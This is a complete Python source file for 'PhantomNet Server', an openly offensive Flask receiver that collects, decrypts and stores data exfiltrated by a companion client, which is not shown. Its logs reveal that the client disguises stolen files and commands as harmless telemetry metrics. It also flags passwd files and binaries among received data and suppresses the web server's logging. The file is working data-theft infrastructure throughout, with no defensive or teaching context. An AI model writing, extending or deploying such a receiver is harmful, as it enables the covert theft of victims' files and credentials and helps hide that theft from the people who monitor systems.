#!/usr/bin/env python3
"""
PhantomNet Server v2.2.0 - Receives and decrypts exfiltrated data
Ephemeral decryption with automatic reconstruction
"""

import os
import sys
import time
import json
import base64
import zlib
from typing import Dict, Tuple
from datetime import datetime

# ASCII Banner
BANNER = """
\033[95m
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝

  ███╗   ██╗███████╗████████╗
  ████╗  ██║██╔════╝╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║
  ██║╚██╗██║██╔══╝     ██║
  ██║ ╚████║███████╗   ██║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝
\033[0m
\033[96m        PhantomNet Server v2.2.0 - Data Receiver
        "Built By Shadowbyte"\033[0m
"""

def _import_crypto():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding as crypto_padding
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
        from cryptography.hazmat.primitives import hashes, serialization
        return {
            'Cipher': Cipher,
            'algorithms': algorithms,
            'modes': modes,
            'backend': default_backend,
            'padding': crypto_padding,
            'asym_padding': asym_padding,
            'hashes': hashes,
            'serialization': serialization
        }
    except ImportError:
        return None


class EphemeralCrypto:
    """Ephemeral decryption - uses one-time keys from client"""

    def __init__(self):
        self.crypto = _import_crypto()
        if not self.crypto:
            raise ImportError("Cryptography library required")

    def decrypt_with_ephemeral_key(self, encrypted_package: Dict[str, bytes]) -> bytes:
        """Decrypt using ephemeral keys from transmission"""

        encrypted_data = encrypted_package['encrypted_data']
        encrypted_aes_key = encrypted_package['encrypted_key']
        iv = encrypted_package['iv']
        private_key_pem = encrypted_package['private_key']

        # Load the ephemeral private key
        private_key = self.crypto['serialization'].load_pem_private_key(
            private_key_pem,
            password=None,
            backend=self.crypto['backend']()
        )

        # Decrypt the ephemeral AES key
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            self.crypto['asym_padding'].OAEP(
                mgf=self.crypto['asym_padding'].MGF1(algorithm=self.crypto['hashes'].SHA256()),
                algorithm=self.crypto['hashes'].SHA256(),
                label=None
            )
        )

        # Decrypt data with ephemeral AES key
        cipher = self.crypto['Cipher'](
            self.crypto['algorithms'].AES(aes_key),
            self.crypto['modes'].CBC(iv),
            backend=self.crypto['backend']()
        )
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Unpad
        unpadder = self.crypto['padding'].PKCS7(128).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()

        # Destroy keys from memory
        aes_key = None
        private_key = None
        del aes_key
        del private_key

        return data


class TelemetryServer:
    """Receives and processes encrypted telemetry"""

    def __init__(self, port: int = 8080, output_dir: str = "./exfiltrated", show_stealth: bool = True):
        print(BANNER)

        self.port = port
        self.output_dir = output_dir
        self.sessions = {}
        self.show_stealth = show_stealth

        try:
            self.crypto = EphemeralCrypto()
        except:
            self.crypto = None

        os.makedirs(output_dir, exist_ok=True)

    def _decode_transport(self, encoded: str) -> bytes:
        """Decode base64 transport encoding"""
        return base64.b64decode(encoded)

    def _decompress_data(self, data: bytes) -> bytes:
        """Decompress data"""
        try:
            return zlib.decompress(data)
        except:
            return data

    def _decrypt_ephemeral_package(self, telemetry: Dict) -> Tuple[bytes, Dict]:
        """
        Decrypt package and extract both data and metadata
        Returns: (data_bytes, metadata_dict)
        """

        if not telemetry.get('encrypted') or not self.crypto:
            # Not encrypted
            payload_encoded = telemetry.get('payload')
            if payload_encoded:
                return self._decode_transport(payload_encoded), telemetry.get('visible_metadata', {})
            return b'', telemetry.get('visible_metadata', {})

        # Reconstruct encrypted package
        encrypted_package = {
            'encrypted_data': self._decode_transport(telemetry['encrypted_data']),
            'encrypted_key': self._decode_transport(telemetry['encrypted_key']),
            'iv': self._decode_transport(telemetry['iv']),
            'private_key': self._decode_transport(telemetry['private_key']),
            'public_key': self._decode_transport(telemetry['public_key'])
        }

        # Decrypt the entire package
        decrypted_package = self.crypto.decrypt_with_ephemeral_key(encrypted_package)

        # Parse the JSON package
        try:
            package = json.loads(decrypted_package.decode('utf-8'))

            # Extract data (base64 encoded in package)
            data_b64 = package.get('data', '')
            data = base64.b64decode(data_b64)

            # Extract real metadata
            metadata = package.get('metadata', {})

            return data, metadata

        except Exception as e:
            # Fallback: treat as raw data
            print(f"\033[91m[!] Package parse error: {e}\033[0m")
            return decrypted_package, {}

    def process_telemetry(self, telemetry: Dict) -> bool:
        """Process received telemetry"""

        try:
            session_id = telemetry.get('session_id')
            visible_metadata = telemetry.get('visible_metadata', {})

            # Decrypt and extract data + real metadata
            encrypted_payload, real_metadata = self._decrypt_ephemeral_package(telemetry)
            data = self._decompress_data(encrypted_payload)

            # Generate filename from real metadata
            if 'filename' in real_metadata:
                filename = real_metadata['filename']
            else:
                filename = f"data_{session_id}.bin"

            # Save to disk
            output_path = os.path.join(self.output_dir, f"{session_id}_{filename}")

            with open(output_path, 'wb') as f:
                f.write(data)

            # Log receipt
            print(f"\033[92m[+] Received: {filename} ({len(data)} bytes)\033[0m")

            # Show stealth info if enabled
            if self.show_stealth and visible_metadata:
                fake_metric = visible_metadata.get('metric_type', 'unknown')
                print(f"    \033[93m[STEALTH] Client showed: {fake_metric} metric\033[0m")

                if 'full_path' in real_metadata:
                    print(f"    \033[93m[STEALTH] Real file: {real_metadata['full_path']}\033[0m")
                if 'command' in real_metadata:
                    print(f"    \033[93m[STEALTH] Command: {real_metadata['command']}\033[0m")

            if telemetry.get('ephemeral_crypto'):
                print(f"    \033[96mEncryption: Ephemeral (one-time keys)\033[0m")

            # Detect file type
            self._detect_file_type(data)

            print()

            return True

        except Exception as e:
            print(f"\033[91m[!] Processing error: {e}\033[0m")
            import traceback
            traceback.print_exc()
            return False

    def _detect_file_type(self, data: bytes):
        """Detect and print file type"""
        if len(data) == 0:
            return

        if data[:4] == b'\x89PNG':
            print(f"    \033[96mType: PNG image\033[0m")
        elif data[:2] == b'\xff\xd8':
            print(f"    \033[96mType: JPEG image\033[0m")
        elif data[:4] == b'%PDF':
            print(f"    \033[96mType: PDF document\033[0m")
        elif data[:2] == b'PK':
            print(f"    \033[96mType: ZIP archive\033[0m")
        elif data[:5] == b'<?xml':
            print(f"    \033[96mType: XML document\033[0m")
        elif b'root:x:' in data[:100]:
            print(f"    \033[96mType: passwd file\033[0m")
        elif b'#!/bin/' in data[:20]:
            print(f"    \033[96mType: Shell script\033[0m")
        elif data[:4] == b'\x7fELF':
            print(f"    \033[96mType: ELF binary\033[0m")

    def run(self):
        """Start server"""
        try:
            from flask import Flask, request, jsonify
        except ImportError:
            print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
            return

        app = Flask(__name__)

        print("="*70)
        print("  \033[1mPhantomNet Server\033[0m")
        print("  Ephemeral Encryption + Zero Metadata Leakage")
        print("="*70)
        print(f"\033[96m[*] Listening on: http://0.0.0.0:{self.port}\033[0m")
        print(f"\033[96m[*] Output directory: {self.output_dir}\033[0m")
        print(f"\033[96m[*] Encryption: Ephemeral (auto-generated, never reused)\033[0m")
        print(f"\033[96m[*] Stealth detection: {'Enabled' if self.show_stealth else 'Disabled'}\033[0m")
        print()

        @app.route('/', methods=['POST'])
        @app.route('/<path:path>', methods=['POST'])
        def receive_telemetry(path=''):
            """Receive telemetry endpoint"""
            try:
                data = request.get_json()
                success = self.process_telemetry(data)

                if success:
                    return jsonify({'status': 'ok'}), 200
                else:
                    return jsonify({'status': 'error'}), 400

            except Exception as e:
                return jsonify({'status': 'error', 'message': str(e)}), 500

        # Disable Flask logging
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        app.run(host='0.0.0.0', port=self.port, debug=False)


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='PhantomNet Server v2.2.0 - Data Receiver',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start server
  python3 server.py --port 8080

  # Start server without showing stealth info
  python3 server.py --port 8080 --no-stealth-info

  # Custom output directory
  python3 server.py --port 8080 --output /tmp/collected
        """
    )

    parser.add_argument('--port', type=int, default=8080, help='Server port (default: 8080)')
    parser.add_argument('--output', default='./exfiltrated', help='Output directory')
    parser.add_argument('--no-stealth-info', action='store_true', help='Don\'t show stealth detection info')

    args = parser.parse_args()

    server = TelemetryServer(
        port=args.port,
        output_dir=args.output,
        show_stealth=not args.no_stealth_info
    )

    server.run()


if __name__ == '__main__':
    main()
